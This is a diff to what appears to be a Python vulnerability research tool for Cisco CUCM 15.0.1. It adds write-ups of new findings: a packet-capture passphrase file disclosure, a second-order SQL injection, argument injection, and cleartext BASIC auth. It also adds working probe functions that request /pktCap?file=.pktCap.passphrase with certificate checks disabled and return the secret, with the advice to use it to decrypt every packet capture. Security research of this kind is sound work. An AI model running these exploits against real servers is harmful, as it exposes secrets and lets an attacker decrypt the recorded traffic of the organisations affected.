@@ -144,12 +144,42 @@ CUCM-F11 HIGH: SAFClientControl inter-cluster passwords decryptable via static k
   DecryptText fallback: after all dynamic key attempts → staticKey() → SetKey(staticKey) → retry
   Consequence: static key ALWAYS decrypts any credential encrypted before dkey migration
 
+CUCM-F12 HIGH: pktCap "file" parameter → passphrase disclosure
+  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 421-586
+  GET /pktCap?file=.pktCap.passphrase → FileInputStream("/var/pktCap/.pktCap.passphrase")
+  Only "/" blocked in file param; hidden files (no "/" in name) served directly
+  DES3 passphrase used by pktCap_protectData openssl cmd: -pass file:/var/pktCap/.pktCap.passphrase
+  Confirmed: pktCap_protectData strings include full openssl des3 command template with passphrase path
+  Requires: "Standard Packet Sniffer Users" role
+  Impact: download passphrase → decrypt ALL /var/pktCap/*.pkt captures offline
+
+CUCM-F13 MEDIUM: pktCap second-order SQLi via remoteUser
+  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 162-215
+  String sql = "...where u.userid='" + request.getRemoteUser() + "' and g.name='Standard Packet Sniffer Users'..."
+  CCMRealm sanitizes ' → '' and \ → \\ ONLY; all other metacharacters unsanitized
+  Second-order: username from LDAP sync stored unsanitized in enduser.userid → injected into SQL at auth-check time
+  FastAccess → Informix → authorization bypass if injection succeeds
+
+CUCM-F14 LOW: pktCap key argument injection into pktCap_protectData
+  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 763-776 + pktCap_protectData binary
+  Runtime.exec(String) tokenizes on whitespace → spaces in key param inject extra args
+  Binary option string: "epdo:i:k:" (getopt_long); flags e/p/d/o/i/k parsed
+  Binary defense: checkForHarmfulMetaChars() blocks $, ;, |, `, (, ), <, >, \, /
+  checkFileName() validates -i arg must == "/var/pktCap/.fileinfo" exactly
+  Impact: mode-flag injection (e.g. -d for decrypt, -e for encrypt) — no shell injection
+
+CUCM-F15 LOW: pktCap BASIC auth over cleartext HTTP
+  File: cm-ccm/pktCap.war → WEB-INF/web.xml
+  <transport-guarantee>NONE</transport-guarantee> + <auth-method>BASIC</auth-method>
+  Credentials transmitted as base64 without TLS on port 8080
+  Chain: on-path sniff pktCap credentials → download .pktCap.passphrase (F12) → decrypt captures
+
 === PENDING TASKS ===
 - ssobackend.jar JWT validation path RE (F6)
 - phone registration LSC/MIC TLS cert verification path in ccm binary (SIP station)
 """
 
-VERSION = "1.2.0"
+VERSION = "1.3.0"
 
 import requests
 import urllib3
@@ -293,6 +323,64 @@ def probe_axl_auth(host: str, username: str, password: str,
         return {"error": str(e)}
 
 
+def probe_pktcap_passphrase(host: str, username: str, password: str, port: int = 8443) -> dict:
+    """
+    CUCM-F12: pktCap file parameter passphrase disclosure.
+    Attempts to download /var/pktCap/.pktCap.passphrase via ?file=.pktCap.passphrase.
+    Requires credentials for a user in the 'Standard Packet Sniffer Users' group.
+    """
+    import base64
+    url = f"https://{host}:{port}/pktCap"
+    params = {"file": ".pktCap.passphrase"}
+    cred = base64.b64encode(f"{username}:{password}".encode()).decode()
+    try:
+        r = requests.get(url, params=params,
+                         headers={"Authorization": f"Basic {cred}"},
+                         verify=False, timeout=15)
+        if r.status_code == 200 and len(r.content) > 0:
+            return {
+                "finding":       "CUCM-F12",
+                "status":        r.status_code,
+                "passphrase_len": len(r.content),
+                "passphrase_hex": r.content.hex(),
+                "passphrase_raw": r.content.decode('utf-8', errors='replace').strip(),
+                "note":          "CONFIRMED: .pktCap.passphrase downloaded — use to decrypt *.pkt captures",
+            }
+        return {
+            "finding": "CUCM-F12",
+            "status":  r.status_code,
+            "note":    ("403/401 = auth rejected or role missing"
+                        if r.status_code in (401, 403) else
+                        "404 = no captures running or file absent"),
+        }
+    except Exception as e:
+        return {"error": str(e), "finding": "CUCM-F12"}
+
+
+def probe_pktcap_fileinfo(host: str, username: str, password: str, port: int = 8443) -> dict:
+    """
+    Probe pktCap for .fileinfo metadata (companion to F12 passphrase probe).
+    .fileinfo contains capture session metadata without requiring a running capture.
+    """
+    import base64
+    url = f"https://{host}:{port}/pktCap"
+    params = {"file": ".fileinfo"}
+    cred = base64.b64encode(f"{username}:{password}".encode()).decode()
+    try:
+        r = requests.get(url, params=params,
+                         headers={"Authorization": f"Basic {cred}"},
+                         verify=False, timeout=15)
+        return {
+            "finding": "CUCM-F12",
+            "file":    ".fileinfo",
+            "status":  r.status_code,
+            "len":     len(r.content),
+            "content": r.content.hex() if r.status_code == 200 else "",
+        }
+    except Exception as e:
+        return {"error": str(e), "finding": "CUCM-F12"}
+
+
 def full_findings_summary() -> str:
     """Return a printable summary of all CUCM RE findings."""
     findings = [
@@ -307,6 +395,10 @@ def full_findings_summary() -> str:
         ("CUCM-F9",  "INFO",     "dbaxlweb DB username exposed; pw encrypted with static key"),
         ("CUCM-F10", "CRITICAL", "SAMLAuthValve returns TRUE regardless of Realm.authenticate() result"),
         ("CUCM-F11", "HIGH",     "SAFClientControl inter-cluster pw decryptable via static key fallback"),
+        ("CUCM-F12", "HIGH",     "pktCap file param — .pktCap.passphrase download → decrypt all packet captures"),
+        ("CUCM-F13", "MEDIUM",   "pktCap second-order SQLi via remoteUser in group membership check"),
+        ("CUCM-F14", "LOW",      "pktCap key arg injection into pktCap_protectData (mode flip, no shell inj)"),
+        ("CUCM-F15", "LOW",      "pktCap BASIC auth over cleartext HTTP (transport-guarantee=NONE)"),
     ]
     lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
     for fid, sev, title in findings:
